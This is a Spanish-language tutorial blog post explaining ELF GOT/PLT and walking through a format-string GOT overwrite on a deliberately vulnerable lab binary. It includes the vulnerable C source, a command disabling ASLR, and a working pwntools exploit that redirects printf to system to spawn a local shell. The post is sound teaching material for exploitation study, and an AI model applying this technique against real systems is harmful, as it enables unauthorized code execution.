---
layout: post
title: GOT overwrite con Format String
author: c4rta
date: 2022-07-30
##categories: [Explotacion binaria]
tags: [Explotacion Binaria, GOT overwrite, format string]
image: /assets/img/formatString-got/waifu.jpg
---
En este articulo veremos un ejemplo muy simple de como sobreescribir GOT aprovechandonos de una vulnerabilidad format string, sobresrcibiremos la direccion de GOT de printf

## GOT y PLT

Para entender esto mejor veremos la estructura de un binario ELF.

![](/assets/img/formatString-got/elf.png)


Ahora pondre otra estructura donde ```section header table``` apunta a la seccion ```.text``` , ```.radata``` y ```.data``` del binario, si se dan cuenta la estructura de arriba es mas extensa que la de abajo, esto es por que un archivo ELF tiene dos vistas, ```Program header table``` donde muestra los segmentos utilizados en tiempo de ejecución, y la otra es ```section header table``` que enumera el conjunto de secciones, simplemente en la imagen de arriba no se muesta explicitamente ```section header table```, pero ambas estructuras son correctas

```
|----------------------|
|      ELF header      |
|----------------------|
| Program header table |
|----------------------|
|        .text         | <--|
|----------------------|    |
|        .rodata       | <--|
|----------------------|    |
|        .data         | <--|
|----------------------|    |
| section header table | ---|
|----------------------|

```
### Direcciones de los simbolos

En un binario ELF una seccion de texto necesita saber la direccion virtual absoluta de un simbolo (como por ejemplo una funcion o variable), esto surge de una operacion donde se toma una direccion o una entrada a PLT, por ejemplo una direccion puede ser esto:

* Una constante de tiempo de enlace
* La base de carga más una constante de tiempo de enlace.

Si se dieron cuenta se menciona la palabra ```enlace``` y esto es por que GOT y PLT se encargan de la gran parte del enlazado dinamico.

Imaginemos una situacion donde tomamos el valor de un simbolo, para poder realizar esto tenemos que hacer que el enlazador dinamico busque la direccion en memoria de ese simbolo y reescriba el codigo para solo poder carga una sola direccion, esto es demasiado proceso e incluso aumenta el tamaño del binario, asi que una mejora mucho mas eficiente y eficaz es reservar un espacio en la memoria del binario en la cual se mantendra la direccion de ese simbolo y posteriormente hacer que el enlazador dinamico ponga la direccion alli en lugar de reescribir todo el codigo, esto es gracias a que existe GOT, y GOT se encuenta en una seccion el binario que se llama .got, se puede ver en la primera imagen.

### ¿Como trabaja GOT y PLT?

GOT trabaja de la siguiente manera, primero GOT se abre como un enlazador dinamico durante la ejecucion del binario, posteriormente obtiene las direcciones absolutas de las funciones solicitadas y GOT se actualiza asi mismo segun lo que fue solicitado, despues toma las solicitudes de las ubicaciones que vienen por parte de PLT, una vez que esto se concluya tenemos el paso final en el cual PLT esta vinculado con la direccion de GOT, entonces ahora el binario puede llamar directamente a esa funcion que fue solicitada desde las librerias. Definitivamente GOT y PLT son los mejores amigos.

### Un pequeño ejemplo

El codigo del ejemplo es el siguiente, compilenlo como quieran, ese no es el que se va a explotar, simplemente solo es para ver como se representaria GOT y PLT en debugger:

```c
#include <stdio.h>
#include <string.h>

int main(){
        char buffer[8];
        gets(buffer);
        puts(buffer);
        return 0;
}
```

Lo que hace este pequeño programa es obtener nuestro input y meterlo en el buffer de 8 bytes usando la funcion ```gets``` para posteriormente imprimirlo con la funcion ```puts```, pasaremos a meter el binario a gdb y a mostrar el main

![](/assets/img/formatString-got/got%26plt.png)

Podemos visualizar algo como esto, donde se ve que tenemos dos entradas de PLT y ahora nuestas funciones de ```gets``` y ```puts``` pasaron a ```gets@plt``` y ```puts@plt``` y esto es por que no se sabe con exactitud donde esta ```gets``` y ```puts```por lo que salta a PLT

***A tomar en cuenta:***

* En caso de que haya una entrada para ```gets``` y ```puts```, ambas funciones saltaran a la direccion que esta almacenada alli

* Las direcciones en memoria de las funciones de libc, como ```gets``` y ```puts``` estan almacenadas en GOT, ya que GOT es una gran tabla de direcciones

### ¿Como nos podemos aprovechar de esto?

Si tenemos una entrada PLT que sea de una funcion de libc, podemos redirigir la entrada PLT hacia otra parte

### GOT overwrite

Esta tecnica consiste en sobreecribir la direccion de GOT de una funcion por una direccion que nosotros queramos, por ejemplo en nuestro binario que vamos a explotar nos vamos a aprovechar de la funcion ```printf```, entonces si sobreescribe la direccion GOT de ```printf``` por cualquier otra lo que va a pasar es que PLT va a adquirir la direccion GOT que sobreescribimos y ejecuta a lo que hayamos indicado.

## Analisis del binario

Primeramente desactivamos el ASRL con:

```echo 0 | sudo tee /proc/sys/kernel/randomize_va_space```

El binario usado lo saque de: ```https://ir0nstone.gitbook.io/notes/```, todo el credito para ```Andrej (aka ir0nstone)```

```c
#include <stdio.h>

void vuln() {
    char buffer[300];
    
    while(1) {
        fgets(buffer, sizeof(buffer), stdin);

        printf(buffer);
        puts("");
    }
}

int main() {
    vuln();

    return 0;
}
```
Lo que haces el binario es mantenerse en un bucle infinito recibiendo nuestros inputs con ```fgets``` y mostrandolos con ```printf``` asi que no podemos hacer BoF, si vemos las protecciones del binario lo unico que tenemos activado es PIE pero realmente no nos interesa si esta activado o no.

```
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      PIE enabled
    RWX:      Has RWX segments
```

## Calculando el offset del buffer y la direccion de libc

### Direccion de libc

Para esto solamente usaremos el comando ldd, y queda asi ```ldd got_overwrite-32```, nos motrara algo como esto

```
	linux-gate.so.1 (0xf7fc3000)
	libc.so.6 => /usr/lib32/libc.so.6 (0xf7c00000)
	/lib/ld-linux.so.2 => /usr/lib/ld-linux.so.2 (0xf7fc5000)
```

Donde la direccion de libc es ```0xf7c00000```

### Calculando el offset del buffer

Viendo que se esta imprimiendo la variable buffer de esta forma ```printf(buffer)``` podemos hace uso de format string, de hecho si le pasamos unos cuantos format string lo que hara es buscar valores de la memoria e imprimirlos como vemos en la imagen

![](/assets/img/formatString-got/format1.png)

Para saber el offset el buffer tenemos que pasarle algunas A en conjunto de unos format string, de esta manera ```AAAAAAAA %p %p %p %p %p %p %p``` esto con el fin de ver desde donde se estan inprimiendo nuestras A, esto nos imprime lo siguiente

![](/assets/img/formatString-got/format2.png)

Entonces si empezamos a contar desde ```0x12c``` hasta donde tengo seleccionado en la imagen, nos da 5, entonces el offset del buffer es 5.

## Armando nuestro exploit

El exploit queda de la siguiente manera

```python
from pwn import *

elf = context.binary = ELF('./got_overwrite-32')
libc = elf.libc
libc.address = 0xf7c00000   

p = process("./got_overwrite-32")

payload = fmtstr_payload(5, {elf.got['printf'] : libc.sym['system']})
p.sendline(payload)

p.clean()
p.sendline('/bin/sh')
p.interactive()
```
Si vemos en esta parte 
```
payload = fmtstr_payload(5, {elf.got['printf'] : libc.sym['system']})
```

El numero 5 es el offset del buffer, lo que estamos haciendo aqui ```elf.got['printf']``` es sacar la direccion GOT de ```printf``` y sustuirla por la de system, y mas abajo se llama de esta manera ```p.sendline('/bin/sh')``` ya que es lo que queremos ejecutar

Y ahora si ejecutamos el exploit debimos de obtener una shell

![](/assets/img/formatString-got/format4.png)

Eso ha sido todo, gracias por leer ❤
